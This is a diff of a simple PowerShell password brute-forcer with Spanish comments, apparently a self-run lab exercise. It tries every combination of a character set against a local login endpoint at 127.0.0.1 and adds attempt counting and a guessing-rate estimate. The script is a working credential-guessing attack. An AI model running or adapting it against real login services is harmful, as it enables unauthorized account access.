@@ -1,39 +1,26 @@
 # brute_digits.ps1 - PowerShell muy simple o eso creo
-
 #
-
 # Puedo cambiar el usuario si quiero, y lo interesante es abrir otro cmd del server
-
 # Y otro del atacante xd
-
 #
-
 # la extension ps1 es obligatorio, aunque puedo cambiar lo anterior a la extension, ya que sirve como
-
-# Invoke‑RestMethod,osea, manejo de objetos JSON entre otros
-
+# Invoke-RestMethod,osea, manejo de objetos JSON entre otros
 #
-
 # brute_digits.ps1 - versión 2.0
-
 # Cambia manualmente $Chars para usar otro conjunto (ej: "abcdefghijklmnopqrstuvwxyz0123456789")
-
 #
-
-# brute_chars.ps1 - PowerShell muy simple (prueba combinaciones de un conjunto de caracteres)
-
+# brute_chars.ps1 - PowerShell muy simple (prueba combinaciones de un conjunto de caracteres moldeables)
 #
-
 # Ejecutar: .\brute_digits.ps1 -User siu -Digits 1
-
 # Cambia $Chars para probar letras, números o ambos
 
 param(
-    [string]$User = "siu",
-    [int]$MinLen = 1,
-    [int]$MaxLen = 3,
-    [string]$Chars = "abcdefghijklmnopqrstuvwxyz0123456789",
-    [string]$Url = "http://127.0.0.1:8000/login"
+    [string]$User = "demo",
+    [int]$MinLen = 1,   #depende la longitud
+    [int]$MaxLen = 1, #depende la longitud x2
+    [string]$Chars = "0123456789abcdefghijklmnopqrstuvwxyz",  #cambiar esto para acelerar la busqueda, es decir si se que es con numeros o combinados, poner un mixto
+    [string]$Url = "http://127.0.0.1:8000/login",
+    [int]$SecondsToEstimate = 10    # "x segundos" para estimar cuántas contraseñas se generan
 )
 # Validaciones simples para que no te equivoques con los parámetros
 
@@ -49,17 +36,11 @@ if ($MaxLen -gt 6) { Write-Host "Atención: MaxLen grande produce muchas combina
 $OutputEncoding = [System.Text.UTF8Encoding]::new()
 
 # -------------------------
-
 # Función que prueba una contraseña
-
 # -------------------------
-
 # - Envía al servidor { username, password } en JSON
-
 # - Si el servidor responde OK (200), imprime que encontró la clave y muestra el mensaje de la API
-
 # - Si responde con error (401, 403, etc.) o falla la conexión, imprime un mensaje apropiado
-
 
 function Try-Password($pw) {
     try {
@@ -97,27 +78,20 @@ function Try-Password($pw) {
 }
 
 # -------------------------
-
 # Generador de combinaciones simple
-
 # -------------------------
-
-# Idea simple (sin magia):
-
+# Idea simple (sin magia xd):
 # - Para cada longitud L (MinLen a MaxLen)
-
 # - Mantengo un array de índices (ej: [0,0,0] para L=3)
-
 # - Cada índice apunta a una posición en $Chars
-
 # - Construyo la contraseña juntando los caracteres indicados por el array
-
 # - Incremento el "contador" desde la derecha (como sumar 1)
-
 #
-
 # Esto genera todas las combinaciones en orden, sin usar recursion ni librerías adicionales
 
+# Contadores y tiempo (agregados mínimos requeridos)
+$attempts = 0
+$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
 $charsetLen = $Chars.Length
 
 for ($len = $MinLen; $len -le $MaxLen; $len++) {
@@ -134,7 +108,24 @@ $pw = -join ($indices | ForEach-Object { $Chars[$_] })
 
 
 # Probar la contraseña construida
-if (Try-Password $pw) { exit 0 }  # si es correcta, salimos de todo
+# incrementar intento antes de probar para contar todos los intentos
+$attempts++
+
+if (Try-Password $pw) {
+    $stopwatch.Stop()
+    $elapsed = $stopwatch.Elapsed.TotalSeconds
+    if ($elapsed -le 0) { $elapsed = 1e-6 } # evitar división por cero
+    $rate = $attempts / $elapsed
+    $estimate = [math]::Floor($rate * $SecondsToEstimate)
+
+    Write-Host "-------------------------------------"
+    Write-Host "Intentos totales: $attempts"
+    Write-Host ("Tiempo transcurrido: {0:N2} segundos" -f $elapsed)
+    Write-Host ("Velocidad aproximada: {0:N2} intentos/segundo" -f $rate)
+    Write-Host "En $SecondsToEstimate segundos se pueden generar aprox.: $estimate contraseñas"
+    Write-Host "-------------------------------------"
+    exit 0
+}
 
 # Incrementar el "contador" manualmente:
 # empezamos por la posición menos significativa (la última),
@@ -155,5 +146,18 @@ if ($pos -lt 0) { break }
 
 # Si llegamos hasta aquí, no se encontró la clave en el rango pedido
 
+$stopwatch.Stop()
+$elapsed = $stopwatch.Elapsed.TotalSeconds
+if ($elapsed -le 0) { $elapsed = 1e-6 }
+$rate = $attempts / $elapsed
+$estimate = [math]::Floor($rate * $SecondsToEstimate)
+
 Write-Host "No se encontró la clave en longitudes" $MinLen ".." $MaxLen "(charset length" $charsetLen ")"
+Write-Host "-------------------------------------"
+Write-Host "Intentos totales: $attempts"
+Write-Host ("Tiempo total: {0:N2} segundos" -f $elapsed)
+Write-Host ("Velocidad aproximada: {0:N2} intentos/segundo" -f $rate)
+Write-Host "En $SecondsToEstimate segundos se pueden generar aprox.: $estimate contraseñas"
+Write-Host "-------------------------------------"
 exit 0
+
